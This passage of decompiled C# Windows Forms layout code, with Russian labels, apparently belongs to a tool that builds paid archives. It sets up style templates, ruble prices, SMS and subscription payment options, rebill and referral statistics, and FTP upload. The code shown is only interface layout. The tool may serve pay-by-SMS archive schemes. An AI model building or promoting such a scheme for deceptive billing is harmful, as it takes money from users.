      this.Tab_addvance_hover.Size = new Size(261, 75);
      this.Tab_addvance_hover.TabIndex = 30;
      this.Tab_addvance_hover.TabStop = false;
      this.Tab_addvance_hover.Visible = false;
      this.Tab_addvance_hover.Click += new EventHandler(this.Tab_Click);
      this.Tab_styles_panel.BackColor = Color.Transparent;
      this.Tab_styles_panel.Controls.Add((Control) this.label24);
      this.Tab_styles_panel.Controls.Add((Control) this.Menu_styleList);
      this.Tab_styles_panel.Controls.Add((Control) this.Menu_newstyle);
      this.Tab_styles_panel.Controls.Add((Control) this.label23);
      this.Tab_styles_panel.Controls.Add((Control) this.label32);
      this.Tab_styles_panel.Location = new Point(163, 4);
      this.Tab_styles_panel.Name = "Tab_styles_panel";
      this.Tab_styles_panel.Size = new Size(167, 49);
      this.Tab_styles_panel.TabIndex = 31;
      this.Tab_styles_panel.Visible = false;
      this.Tab_styles_panel.MouseEnter += new EventHandler(this.MainPanel_MouseEnter);
      this.label24.AutoSize = true;
      this.label24.Location = new Point(14, 44);
      this.label24.Name = "label24";
      this.label24.Size = new Size(358, 14);
      this.label24.TabIndex = 19;
      this.label24.Text = "В данном разделе Вы можете создать собственный стиль (дизайн).";
      this.label24.TextAlign = ContentAlignment.MiddleLeft;
      this.Menu_styleList.Controls.Add((Control) this.label35);
      this.Menu_styleList.Controls.Add((Control) this.pictureBox9);
      this.Menu_styleList.Controls.Add((Control) this.label36);
      this.Menu_styleList.Cursor = Cursors.Hand;
      this.Menu_styleList.ForeColor = Color.Black;
      this.Menu_styleList.Location = new Point(17, 177);
      this.Menu_styleList.Name = "Menu_styleList";
      this.Menu_styleList.Size = new Size(494, 66);
      this.Menu_styleList.TabIndex = 18;
      this.Menu_styleList.Click += new EventHandler(this.Menu_Click);
      this.Menu_styleList.MouseEnter += new EventHandler(this.Panel_MouseEnter);
      this.label35.AutoSize = true;
      this.label35.Location = new Point(93, 29);
      this.label35.Name = "label35";
      this.label35.Size = new Size(138, 14);
      this.label35.TabIndex = 9;
      this.label35.Text = "Просмотр списка стилей.";
      this.label35.TextAlign = ContentAlignment.MiddleLeft;
      this.label35.Click += new EventHandler(this.Menu_Click);
      this.pictureBox9.Image = (Image) Resources._2_2_spisok;
      this.pictureBox9.Location = new Point(30, 9);
      this.pictureBox9.Name = "pictureBox9";
      this.pictureBox9.Size = new Size(48, 48);
      this.pictureBox9.TabIndex = 3;
      this.pictureBox9.TabStop = false;
      this.pictureBox9.Click += new EventHandler(this.Menu_Click);
      this.label36.AutoSize = true;
      this.label36.Font = new Font("Arial", 15f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label36.ForeColor = Color.FromArgb(53, 88, 81);
      this.label36.Location = new Point(93, 9);
      this.label36.Name = "label36";
      this.label36.Size = new Size(109, 17);
      this.label36.TabIndex = 8;
      this.label36.Text = "Список стилей";
      this.label36.Click += new EventHandler(this.Menu_Click);
      this.Menu_newstyle.Controls.Add((Control) this.label37);
      this.Menu_newstyle.Controls.Add((Control) this.label38);
      this.Menu_newstyle.Controls.Add((Control) this.pictureBox10);
      this.Menu_newstyle.Cursor = Cursors.Hand;
      this.Menu_newstyle.ForeColor = Color.Black;
      this.Menu_newstyle.Location = new Point(17, 101);
      this.Menu_newstyle.Name = "Menu_newstyle";
      this.Menu_newstyle.Size = new Size(494, 66);
      this.Menu_newstyle.TabIndex = 17;
      this.Menu_newstyle.Click += new EventHandler(this.Menu_Click);
      this.Menu_newstyle.MouseEnter += new EventHandler(this.Panel_MouseEnter);
      this.label37.AutoSize = true;
      this.label37.Location = new Point(93, 29);
      this.label37.Name = "label37";
      this.label37.Size = new Size(294, 14);
      this.label37.TabIndex = 7;
      this.label37.Text = "Конструктор для создания собственного стиля архива.";
      this.label37.TextAlign = ContentAlignment.MiddleLeft;
      this.label37.Click += new EventHandler(this.Menu_Click);
      this.label38.AutoSize = true;
      this.label38.Font = new Font("Arial", 15f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label38.ForeColor = Color.FromArgb(53, 88, 81);
      this.label38.Location = new Point(93, 9);
      this.label38.Name = "label38";
      this.label38.Size = new Size(156, 17);
      this.label38.TabIndex = 6;
      this.label38.Text = "Создать новый стиль";
      this.label38.Click += new EventHandler(this.Menu_Click);
      this.pictureBox10.Image = (Image) Resources._2_1_newstyle;
      this.pictureBox10.Location = new Point(30, 9);
      this.pictureBox10.Name = "pictureBox10";
      this.pictureBox10.Size = new Size(48, 48);
      this.pictureBox10.SizeMode = PictureBoxSizeMode.CenterImage;
      this.pictureBox10.TabIndex = 2;
      this.pictureBox10.TabStop = false;
      this.pictureBox10.Click += new EventHandler(this.Menu_Click);
      this.label23.AutoSize = true;
      this.label23.Font = new Font("Arial", 12f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label23.ForeColor = Color.DarkRed;
      this.label23.Location = new Point(42, 264);
      this.label23.Name = "label23";
      this.label23.Size = new Size(424, 15);
      this.label23.TabIndex = 1;
      this.label23.Text = "Внимание! На данный момент раздел находится в процессе разрабоки";
      this.label23.Visible = false;
      this.label32.AutoSize = true;
      this.label32.Font = new Font("Arial", 18f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label32.ForeColor = Color.FromArgb(53, 88, 81);
      this.label32.Location = new Point(11, 17);
      this.label32.Name = "label32";
      this.label32.Size = new Size(146, 21);
      this.label32.TabIndex = 0;
      this.label32.Text = "Стили архивов";
      this.Cont_Main.BackColor = Color.Transparent;
      this.Cont_Main.Controls.Add((Control) this.Menu_statistic_cont);
      this.Cont_Main.Controls.Add((Control) this.Tab_styles_panel);
      this.Cont_Main.Controls.Add((Control) this.Menu_newstyle_cont);
      this.Cont_Main.Controls.Add((Control) this.Menu_archivation_cont);
      this.Cont_Main.Controls.Add((Control) this.Menu_styleList_cont);
      this.Cont_Main.Controls.Add((Control) this.Menu_archiveList_cont);
      this.Cont_Main.Controls.Add((Control) this.Tab_archivation_panel);
      this.Cont_Main.Controls.Add((Control) this.Menu_FTP_cont);
      this.Cont_Main.Controls.Add((Control) this.Tab_addvance_panel);
      this.Cont_Main.Controls.Add((Control) this.Menu_Tasks_cont);
      this.Cont_Main.Controls.Add((Control) this.Menu_Project_cont);
      this.Cont_Main.Location = new Point(267, 96);
      this.Cont_Main.Name = "Cont_Main";
      this.Cont_Main.Size = new Size(521, 422);
      this.Cont_Main.TabIndex = 32;
      this.Menu_statistic_cont.BackColor = Color.Transparent;
      this.Menu_statistic_cont.Controls.Add((Control) this.StatisticListView);
      this.Menu_statistic_cont.Controls.Add((Control) this.label4);
      this.Menu_statistic_cont.Location = new Point(340, 58);
      this.Menu_statistic_cont.Name = "Menu_statistic_cont";
      this.Menu_statistic_cont.Size = new Size(168, 42);
      this.Menu_statistic_cont.TabIndex = 34;
      this.Menu_statistic_cont.Visible = false;
      this.Menu_statistic_cont.VisibleChanged += new EventHandler(this.Menu_statistic_cont_VisibleChanged);
      this.StatisticListView.Columns.AddRange(new ColumnHeader[9]
      {
        this.Date,
        this.Opened,
        this.Downed,
        this.SMS,
        this.SubsOn,
        this.SubsOff,
        this.Rebils,
        this.RefSum,
        this.Summary
      });
      this.StatisticListView.FullRowSelect = true;
      this.StatisticListView.HeaderStyle = ColumnHeaderStyle.Nonclickable;
      this.StatisticListView.Location = new Point(12, 49);
      this.StatisticListView.MultiSelect = false;
      this.StatisticListView.Name = "StatisticListView";
      this.StatisticListView.Size = new Size(493, 357);
      this.StatisticListView.TabIndex = 14;
      this.StatisticListView.UseCompatibleStateImageBehavior = false;
      this.StatisticListView.View = View.Details;
      this.Date.Text = "Дата";
      this.Date.Width = 68;
      this.Opened.Text = "Открытий";
      this.Opened.Width = 64;
      this.Downed.Text = "Скачиваний";
      this.SMS.Text = "SMS";
      this.SMS.Width = 44;
      this.SubsOn.Text = "Подписки";
      this.SubsOff.Text = "Отписки";
      this.Rebils.Text = "Ребиллы";
      this.RefSum.Text = "Реф.";
      this.RefSum.Width = 53;
      this.Summary.Text = "Итого";
      this.Summary.Width = 74;
      this.label4.AutoSize = true;
      this.label4.Font = new Font("Arial", 18f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label4.ForeColor = Color.FromArgb(53, 88, 81);
      this.label4.Location = new Point(11, 17);
      this.label4.Name = "label4";
      this.label4.Size = new Size(174, 21);
      this.label4.TabIndex = 0;
      this.label4.Text = "Общая статистика";
      this.Menu_newstyle_cont.BackColor = Color.Transparent;
      this.Menu_newstyle_cont.Controls.Add((Control) this.inf);
      this.Menu_newstyle_cont.Controls.Add((Control) this.BrowsStyle);
      this.Menu_newstyle_cont.Controls.Add((Control) this.label56);
      this.Menu_newstyle_cont.Controls.Add((Control) this.label9);
      this.Menu_newstyle_cont.Controls.Add((Control) this.StylePath);
      this.Menu_newstyle_cont.Controls.Add((Control) this.StyleName);
      this.Menu_newstyle_cont.Controls.Add((Control) this.StyleCreate);
      this.Menu_newstyle_cont.Controls.Add((Control) this.StyleTest);
      this.Menu_newstyle_cont.Controls.Add((Control) this.StyleList);
      this.Menu_newstyle_cont.Controls.Add((Control) this.label10);
      this.Menu_newstyle_cont.Location = new Point(163, 60);
      this.Menu_newstyle_cont.Name = "Menu_newstyle_cont";
      this.Menu_newstyle_cont.Size = new Size(167, 48);
      this.Menu_newstyle_cont.TabIndex = 34;
      this.Menu_newstyle_cont.Visible = false;
      this.inf.AutoSize = true;
      this.inf.ForeColor = Color.DarkRed;
      this.inf.Location = new Point(237, 376);
      this.inf.Name = "inf";
      this.inf.Size = new Size(239, 28);
      this.inf.TabIndex = 22;
      this.inf.Text = "Подождите пожалуйста. Создание тестового\r\nархива займет несколько секунд.";
      this.inf.TextAlign = ContentAlignment.MiddleLeft;
      this.inf.Visible = false;
      this.BrowsStyle.Location = new Point(435, 115);
      this.BrowsStyle.Name = "BrowsStyle";
      this.BrowsStyle.Size = new Size(70, 23);
      this.BrowsStyle.TabIndex = 21;
      this.BrowsStyle.Text = "Обзор";
      this.BrowsStyle.UseVisualStyleBackColor = true;
      this.BrowsStyle.Click += new EventHandler(this.BrowsStyle_Click);
      this.label56.AutoSize = true;
      this.label56.Font = new Font("Arial", 12f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label56.ForeColor = Color.FromArgb(53, 88, 81);
      this.label56.Location = new Point(12, 96);
      this.label56.Name = "label56";
      this.label56.Size = new Size(288, 15);
      this.label56.TabIndex = 20;
      this.label56.Text = "Путь к корневой папке html шаблона (max 3 MB)";
      this.label9.AutoSize = true;
      this.label9.Font = new Font("Arial", 12f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label9.ForeColor = Color.FromArgb(53, 88, 81);
      this.label9.Location = new Point(12, 47);
      this.label9.Name = "label9";
      this.label9.Size = new Size(100, 15);
      this.label9.TabIndex = 19;
      this.label9.Text = "Название стиля";
      this.StylePath.BackColor = Color.White;
      this.StylePath.Location = new Point(12, 117);
      this.StylePath.Name = "StylePath";
      this.StylePath.ReadOnly = true;
      this.StylePath.Size = new Size(419, 20);
      this.StylePath.TabIndex = 18;
      this.StyleName.Location = new Point(12, 69);
      this.StyleName.Name = "StyleName";
      this.StyleName.Size = new Size(493, 20);
      this.StyleName.TabIndex = 17;
      this.StyleCreate.Enabled = false;
      this.StyleCreate.Location = new Point(126, 376);
      this.StyleCreate.Name = "StyleCreate";
      this.StyleCreate.Size = new Size(105, 30);
      this.StyleCreate.TabIndex = 16;
      this.StyleCreate.Text = "Создать";
      this.StyleCreate.UseVisualStyleBackColor = true;
      this.StyleCreate.Click += new EventHandler(this.StyleCreate_Click);
      this.StyleTest.Enabled = false;
      this.StyleTest.Location = new Point(12, 376);
      this.StyleTest.Name = "StyleTest";
      this.StyleTest.Size = new Size(105, 30);
      this.StyleTest.TabIndex = 15;
      this.StyleTest.Text = "Проверить";
      this.StyleTest.UseVisualStyleBackColor = true;
      this.StyleTest.Click += new EventHandler(this.StyleTest_Click);
      this.StyleList.AllowColumnReorder = true;
      this.StyleList.BackColor = Color.White;
      this.StyleList.Columns.AddRange(new ColumnHeader[3]
      {
        this.columnHeader6,
        this.columnHeader11,
        this.columnHeader12
      });
      this.StyleList.Enabled = false;
      this.StyleList.FullRowSelect = true;
      listViewGroup1.Header = "Ошибки";
      listViewGroup1.Name = "listViewGroup1";
      listViewGroup2.Header = "Примечании";
      listViewGroup2.Name = "listViewGroup2";
      listViewGroup3.Header = "Правильно ";
      listViewGroup3.Name = "listViewGroup3";
      this.StyleList.Groups.AddRange(new ListViewGroup[3]
      {
        listViewGroup1,
        listViewGroup2,
        listViewGroup3
      });
      this.StyleList.HeaderStyle = ColumnHeaderStyle.Nonclickable;
      this.StyleList.Location = new Point(12, 149);
      this.StyleList.MultiSelect = false;
      this.StyleList.Name = "StyleList";
      this.StyleList.Size = new Size(493, 221);
      this.StyleList.SmallImageList = this.imageList1;
      this.StyleList.TabIndex = 14;
      this.StyleList.UseCompatibleStateImageBehavior = false;
      this.StyleList.View = View.Details;
      this.columnHeader6.Text = "ID";
      this.columnHeader6.Width = 144;
      this.columnHeader11.Text = "Страница";
      this.columnHeader11.Width = 99;
      this.columnHeader12.Text = "Статус";
      this.columnHeader12.Width = 241;
      this.imageList1.ImageStream = (ImageListStreamer) componentResourceManager.GetObject("imageList1.ImageStream");
      this.imageList1.TransparentColor = Color.Transparent;
      this.imageList1.Images.SetKeyName(0, "1.png");
      this.imageList1.Images.SetKeyName(1, "2.png");
      this.imageList1.Images.SetKeyName(2, "3.png");
      this.label10.AutoSize = true;
      this.label10.Font = new Font("Arial", 18f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label10.ForeColor = Color.FromArgb(53, 88, 81);
      this.label10.Location = new Point(11, 17);
      this.label10.Name = "label10";
      this.label10.Size = new Size(230, 21);
      this.label10.TabIndex = 0;
      this.label10.Text = "Создание ногого стилья";
      this.Menu_archivation_cont.BackColor = Color.Transparent;
      this.Menu_archivation_cont.Controls.Add((Control) this.ForUpdateArchive);
      this.Menu_archivation_cont.Controls.Add((Control) this.ForNewArch);
      this.Menu_archivation_cont.Controls.Add((Control) this.panel4);
      this.Menu_archivation_cont.Controls.Add((Control) this.panel3);
      this.Menu_archivation_cont.Controls.Add((Control) this.panel2);
      this.Menu_archivation_cont.Controls.Add((Control) this.panel1);
      this.Menu_archivation_cont.Controls.Add((Control) this.SelectArchiveLangage);
      this.Menu_archivation_cont.Controls.Add((Control) this.label52);
      this.Menu_archivation_cont.Controls.Add((Control) this.UseMyIcon);
      this.Menu_archivation_cont.Controls.Add((Control) this.label50);
      this.Menu_archivation_cont.Controls.Add((Control) this.SelectArchiveStyle);
      this.Menu_archivation_cont.Controls.Add((Control) this.label49);
      this.Menu_archivation_cont.Controls.Add((Control) this.SavedProfiles);
      this.Menu_archivation_cont.Controls.Add((Control) this.label41);
      this.Menu_archivation_cont.Controls.Add((Control) this.label40);
      this.Menu_archivation_cont.Controls.Add((Control) this.label47);
      this.Menu_archivation_cont.Location = new Point(14, 60);
      this.Menu_archivation_cont.Name = "Menu_archivation_cont";
      this.Menu_archivation_cont.Size = new Size(135, 48);
      this.Menu_archivation_cont.TabIndex = 32;
      this.Menu_archivation_cont.Visible = false;
      this.Menu_archivation_cont.VisibleChanged += new EventHandler(this.Menu_archivation_cont_VisibleChanged);
      this.ForUpdateArchive.Controls.Add((Control) this.button3);
      this.ForUpdateArchive.Controls.Add((Control) this.OldFileBrouse);
      this.ForUpdateArchive.Controls.Add((Control) this.OldFilePath);
      this.ForUpdateArchive.Controls.Add((Control) this.OldFileList);
      this.ForUpdateArchive.Controls.Add((Control) this.label8);
      this.ForUpdateArchive.Location = new Point(2, 70);
      this.ForUpdateArchive.Name = "ForUpdateArchive";
      this.ForUpdateArchive.Size = new Size(506, 135);
      this.ForUpdateArchive.TabIndex = 60;
      this.ForUpdateArchive.Visible = false;
      this.button3.Location = new Point(424, 112);
      this.button3.Name = "button3";
      this.button3.Size = new Size(75, 23);
      this.button3.TabIndex = 22;
      this.button3.Text = "Обновить";
      this.button3.UseVisualStyleBackColor = true;
      this.button3.Click += new EventHandler(this.CreateArchive_Click);
      this.OldFileBrouse.Location = new Point(425, 20);
      this.OldFileBrouse.Name = "OldFileBrouse";
      this.OldFileBrouse.Size = new Size(75, 23);
      this.OldFileBrouse.TabIndex = 21;
      this.OldFileBrouse.Text = "Обзор";
      this.OldFileBrouse.UseVisualStyleBackColor = true;
      this.OldFileBrouse.Click += new EventHandler(this.OldFileBrouse_Click);
      this.OldFilePath.BackColor = SystemColors.ButtonHighlight;
      this.OldFilePath.Location = new Point(13, 22);
      this.OldFilePath.Name = "OldFilePath";
      this.OldFilePath.ReadOnly = true;
      this.OldFilePath.Size = new Size(404, 20);
      this.OldFilePath.TabIndex = 20;
      this.OldFileList.Columns.AddRange(new ColumnHeader[5]
      {
        this.columnHeader1,
        this.columnHeader2,
        this.columnHeader3,
        this.columnHeader4,
        this.columnHeader5
      });
      this.OldFileList.FullRowSelect = true;
      this.OldFileList.HeaderStyle = ColumnHeaderStyle.Nonclickable;
      this.OldFileList.Location = new Point(13, 45);
      this.OldFileList.Name = "OldFileList";
      this.OldFileList.Size = new Size(486, 63);
      this.OldFileList.SmallImageList = this.imageList;
      this.OldFileList.TabIndex = 18;
      this.OldFileList.UseCompatibleStateImageBehavior = false;
      this.OldFileList.View = View.Details;
      this.columnHeader1.Text = "Название";
      this.columnHeader1.Width = 132;
      this.columnHeader2.Text = "Дата Создания";
      this.columnHeader2.Width = 93;
      this.columnHeader3.Text = "Посл. обновление";
      this.columnHeader3.Width = 109;
      this.columnHeader4.Text = "Стоимость";
      this.columnHeader4.Width = 76;
      this.columnHeader5.Text = "Подписки";
      this.columnHeader5.Width = 67;
      this.imageList.ImageStream = (ImageListStreamer) componentResourceManager.GetObject("imageList.ImageStream");
      this.imageList.TransparentColor = Color.Transparent;
      this.imageList.Images.SetKeyName(0, "folder.png");
      this.imageList.Images.SetKeyName(1, "file.png");
      this.imageList.Images.SetKeyName(2, "error.png");
      this.label8.AutoSize = true;
      this.label8.Font = new Font("Arial", 12f, FontStyle.Bold, GraphicsUnit.Pixel);
      this.label8.ForeColor = Color.FromArgb(53, 88, 81);
      this.label8.Location = new Point(10, 2);
      this.label8.Name = "label8";
      this.label8.Size = new Size(106, 15);
      this.label8.TabIndex = 6;
      this.label8.Text = "Архив - источник";
      this.ForNewArch.Controls.Add((Control) this.CreateArchive);
      this.ForNewArch.Controls.Add((Control) this.ClearFiles);
      this.ForNewArch.Controls.Add((Control) this.DeleteFiles);
      this.ForNewArch.Controls.Add((Control) this.AddFiles);
      this.ForNewArch.Controls.Add((Control) this.ArchivationList);
      this.ForNewArch.Controls.Add((Control) this.label45);
      this.ForNewArch.Location = new Point(2, 102);
      this.ForNewArch.Name = "ForNewArch";
      this.ForNewArch.Size = new Size(506, 20);
      this.ForNewArch.TabIndex = 59;
      this.CreateArchive.Location = new Point(396, 109);
      this.CreateArchive.Name = "CreateArchive";
      this.CreateArchive.Size = new Size(104, 23);
      this.CreateArchive.TabIndex = 22;
      this.CreateArchive.Text = "Создать архив";
      this.CreateArchive.UseVisualStyleBackColor = true;
      this.CreateArchive.Click += new EventHandler(this.CreateArchive_Click);
      this.ClearFiles.Location = new Point(167, 109);
      this.ClearFiles.Name = "ClearFiles";
      this.ClearFiles.Size = new Size(65, 23);
      this.ClearFiles.TabIndex = 21;
      this.ClearFiles.Text = "Очистить";
      this.ClearFiles.UseVisualStyleBackColor = true;
      this.ClearFiles.Click += new EventHandler(this.ClearFiles_Click);
      this.DeleteFiles.Location = new Point(96, 109);
      this.DeleteFiles.Name = "DeleteFiles";
      this.DeleteFiles.Size = new Size(65, 23);
      this.DeleteFiles.TabIndex = 20;
      this.DeleteFiles.Text = "Удалить";
      this.DeleteFiles.UseVisualStyleBackColor = true;
      this.DeleteFiles.Click += new EventHandler(this.DeleteFiles_Click);
      this.AddFiles.Location = new Point(13, 109);
      this.AddFiles.Name = "AddFiles";
      this.AddFiles.Size = new Size(77, 23);
      this.AddFiles.TabIndex = 19;
      this.AddFiles.Text = "Добавить";
      this.AddFiles.UseVisualStyleBackColor = true;
      this.AddFiles.Click += new EventHandler(this.AddFiles_Click);
      this.ArchivationList.Columns.AddRange(new ColumnHeader[3]
      {
        this.F_Name,
        this.F_Size,
        this.F_Sours
      });
      this.ArchivationList.FullRowSelect = true;
      this.ArchivationList.HeaderStyle = ColumnHeaderStyle.Nonclickable;
      this.ArchivationList.Location = new Point(13, 18);
      this.ArchivationList.Name = "ArchivationList";
      this.ArchivationList.Size = new Size(486, 88);
      this.ArchivationList.SmallImageList = this.imageList;
      this.ArchivationList.TabIndex = 18;
      this.ArchivationList.UseCompatibleStateImageBehavior = false;
      this.ArchivationList.View = View.Details;
      this.F_Name.Text = "Имя";
      this.F_Name.Width = 118;
      this.F_Size.Text = "Размер";
      this.F_Size.Width = 87;
      this.F_Sours.Text = "Источник";
      this.F_Sours.Width = 275;
      this.label45.AutoSize = true;
      this.label45.Font = new Font("Arial", 12f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label45.ForeColor = Color.FromArgb(53, 88, 81);
      this.label45.Location = new Point(10, 1);
      this.label45.Name = "label45";
      this.label45.Size = new Size(142, 15);
      this.label45.TabIndex = 6;
      this.label45.Text = "Список папок и файлов";
      this.panel4.BackColor = Color.FromArgb(242, 233, 204);
      this.panel4.Controls.Add((Control) this.UpdateArchive);
      this.panel4.Controls.Add((Control) this.NewArchive);
      this.panel4.Location = new Point(13, 47);
      this.panel4.Name = "panel4";
      this.panel4.Size = new Size(486, 20);
      this.panel4.TabIndex = 58;
      this.UpdateArchive.AutoSize = true;
      this.UpdateArchive.Location = new Point(105, 1);
      this.UpdateArchive.Name = "UpdateArchive";
      this.UpdateArchive.Size = new Size(128, 18);
      this.UpdateArchive.TabIndex = 35;
      this.UpdateArchive.Text = "Обновление архива";
      this.UpdateArchive.UseVisualStyleBackColor = true;
      this.UpdateArchive.CheckedChanged += new EventHandler(this.ArchivationTypeChange);
      this.NewArchive.AutoSize = true;
      this.NewArchive.Checked = true;
      this.NewArchive.Location = new Point(11, 1);
      this.NewArchive.Name = "NewArchive";
      this.NewArchive.Size = new Size(93, 18);
      this.NewArchive.TabIndex = 34;
      this.NewArchive.TabStop = true;
      this.NewArchive.Text = "Новый архив";
      this.NewArchive.UseVisualStyleBackColor = true;
      this.NewArchive.CheckedChanged += new EventHandler(this.ArchivationTypeChange);
      this.panel3.BackColor = Color.FromArgb(242, 233, 204);
      this.panel3.Controls.Add((Control) this.SaveAsProject);
      this.panel3.Controls.Add((Control) this.Project_Name);
      this.panel3.Controls.Add((Control) this.label53);
      this.panel3.Location = new Point(15, 384);
      this.panel3.Name = "panel3";
      this.panel3.Size = new Size(486, 29);
      this.panel3.TabIndex = 57;
      this.SaveAsProject.Font = new Font("Arial", 10f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.SaveAsProject.Location = new Point(305, 5);
      this.SaveAsProject.Name = "SaveAsProject";
      this.SaveAsProject.Size = new Size(135, 20);
      this.SaveAsProject.TabIndex = 35;
      this.SaveAsProject.Text = "Сохранить как проект";
      this.SaveAsProject.UseVisualStyleBackColor = true;
      this.SaveAsProject.Click += new EventHandler(this.SaveAsProject_Click);
      this.Project_Name.Location = new Point(92, 5);
      this.Project_Name.Name = "Project_Name";
      this.Project_Name.Size = new Size(199, 20);
      this.Project_Name.TabIndex = 34;
      this.label53.AutoSize = true;
      this.label53.BackColor = Color.FromArgb(242, 233, 204);
      this.label53.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label53.ForeColor = SystemColors.InfoText;
      this.label53.Location = new Point(7, 8);
      this.label53.Name = "label53";
      this.label53.Size = new Size(77, 14);
      this.label53.TabIndex = 33;
      this.label53.Text = "Имя проекта:";
      this.panel2.BackColor = Color.FromArgb(228, 235, 231);
      this.panel2.Controls.Add((Control) this.ShowPriseForClient);
      this.panel2.Controls.Add((Control) this.UseOpenCount);
      this.panel2.Controls.Add((Control) this.label48);
      this.panel2.Controls.Add((Control) this.label46);
      this.panel2.Controls.Add((Control) this.label44);
      this.panel2.Controls.Add((Control) this.SelectFtpConection);
      this.panel2.Location = new Point(15, 334);
      this.panel2.Name = "panel2";
      this.panel2.Size = new Size(486, 44);
      this.panel2.TabIndex = 57;
      this.ShowPriseForClient.AutoSize = true;
      this.ShowPriseForClient.BackColor = Color.FromArgb(228, 235, 231);
      this.ShowPriseForClient.Location = new Point(158, 20);
      this.ShowPriseForClient.Name = "ShowPriseForClient";
      this.ShowPriseForClient.Size = new Size(90, 18);
      this.ShowPriseForClient.TabIndex = 44;
      this.ShowPriseForClient.Text = "Отображать";
      this.ShowPriseForClient.UseVisualStyleBackColor = false;
      this.UseOpenCount.AutoSize = true;
      this.UseOpenCount.BackColor = Color.FromArgb(228, 235, 231);
      this.UseOpenCount.Location = new Point(11, 20);
      this.UseOpenCount.Name = "UseOpenCount";
      this.UseOpenCount.Size = new Size(69, 18);
      this.UseOpenCount.TabIndex = 43;
      this.UseOpenCount.Text = "Считать";
      this.UseOpenCount.UseVisualStyleBackColor = false;
      this.label48.AutoSize = true;
      this.label48.BackColor = Color.FromArgb(228, 235, 231);
      this.label48.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label48.ForeColor = SystemColors.InfoText;
      this.label48.Location = new Point(302, 3);
      this.label48.Name = "label48";
      this.label48.Size = new Size(182, 14);
      this.label48.TabIndex = 42;
      this.label48.Text = "Загрузка на FTP после архивации:";
      this.label46.AutoSize = true;
      this.label46.BackColor = Color.FromArgb(228, 235, 231);
      this.label46.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label46.ForeColor = SystemColors.InfoText;
      this.label46.Location = new Point(155, 3);
      this.label46.Name = "label46";
      this.label46.Size = new Size(132, 14);
      this.label46.TabIndex = 41;
      this.label46.Text = "Стоимость для клиента:";
      this.label44.AutoSize = true;
      this.label44.BackColor = Color.FromArgb(228, 235, 231);
      this.label44.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label44.ForeColor = SystemColors.InfoText;
      this.label44.Location = new Point(8, 3);
      this.label44.Name = "label44";
      this.label44.Size = new Size(124, 14);
      this.label44.TabIndex = 40;
      this.label44.Text = "Количество открытий:";
      this.SelectFtpConection.DrawMode = DrawMode.OwnerDrawFixed;
      this.SelectFtpConection.DropDownStyle = ComboBoxStyle.DropDownList;
      this.SelectFtpConection.FormattingEnabled = true;
      this.SelectFtpConection.Location = new Point(305, 20);
      this.SelectFtpConection.Name = "SelectFtpConection";
      this.SelectFtpConection.Size = new Size(175, 21);
      this.SelectFtpConection.TabIndex = 45;
      this.SelectFtpConection.DrawItem += new DrawItemEventHandler(this.comboBox_DrawItem);
      this.panel1.BackColor = Color.FromArgb(228, 235, 231);
      this.panel1.Controls.Add((Control) this.label43);
      this.panel1.Controls.Add((Control) this.IndicateAltPaymentSum);
      this.panel1.Controls.Add((Control) this.AllowAltPayment);
      this.panel1.Controls.Add((Control) this.label42);
      this.panel1.Controls.Add((Control) this.SelectArchivePrice);
      this.panel1.Controls.Add((Control) this.label39);
      this.panel1.Controls.Add((Control) this.SelectPaymentType);
      this.panel1.Controls.Add((Control) this.label25);
      this.panel1.Location = new Point(15, 245);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(486, 44);
      this.panel1.TabIndex = 56;
      this.label43.AutoSize = true;
      this.label43.BackColor = Color.FromArgb(228, 235, 231);
      this.label43.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label43.ForeColor = SystemColors.InfoText;
      this.label43.Location = new Point(456, 23);
      this.label43.Name = "label43";
      this.label43.Size = new Size(28, 14);
      this.label43.TabIndex = 39;
      this.label43.Text = "руб.";
      this.IndicateAltPaymentSum.Enabled = false;
      this.IndicateAltPaymentSum.Location = new Point(408, 19);
      this.IndicateAltPaymentSum.MaxLength = 3;
      this.IndicateAltPaymentSum.Name = "IndicateAltPaymentSum";
      this.IndicateAltPaymentSum.Size = new Size(43, 20);
      this.IndicateAltPaymentSum.TabIndex = 38;
      this.IndicateAltPaymentSum.KeyPress += new KeyPressEventHandler(this.IndicateAltPaymentSum_KeyPress);
      this.AllowAltPayment.AutoSize = true;
      this.AllowAltPayment.BackColor = Color.FromArgb(228, 235, 231);
      this.AllowAltPayment.Location = new Point(305, 21);
      this.AllowAltPayment.Name = "AllowAltPayment";
      this.AllowAltPayment.Size = new Size(104, 18);
      this.AllowAltPayment.TabIndex = 37;
      this.AllowAltPayment.Text = "Использовать,";
      this.AllowAltPayment.UseVisualStyleBackColor = false;
      this.AllowAltPayment.CheckedChanged += new EventHandler(this.AllowAltPayment_CheckedChanged);
      this.label42.AutoSize = true;
      this.label42.BackColor = Color.FromArgb(228, 235, 231);
      this.label42.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel);
      this.label42.ForeColor = SystemColors.InfoText;
      this.label42.Location = new Point(302, 4);
      this.label42.Name = "label42";
      this.label42.Size = new Size(182, 14);
      this.label42.TabIndex = 36;
      this.label42.Text = "Альтернативные методы оплаты:";
      this.SelectArchivePrice.DrawMode = DrawMode.OwnerDrawFixed;
      this.SelectArchivePrice.DropDownStyle = ComboBoxStyle.DropDownList;
      this.SelectArchivePrice.FormattingEnabled = true;
      this.SelectArchivePrice.Items.AddRange(new object[4]
      {
        (object) "30 руб.",
        (object) "90 руб.",
        (object) "150 руб.",
        (object) "300 руб."
      });
      this.SelectArchivePrice.Location = new Point(158, 19);
      this.SelectArchivePrice.Name = "SelectArchivePrice";
      this.SelectArchivePrice.Size = new Size(133, 21);
      this.SelectArchivePrice.TabIndex = 35;
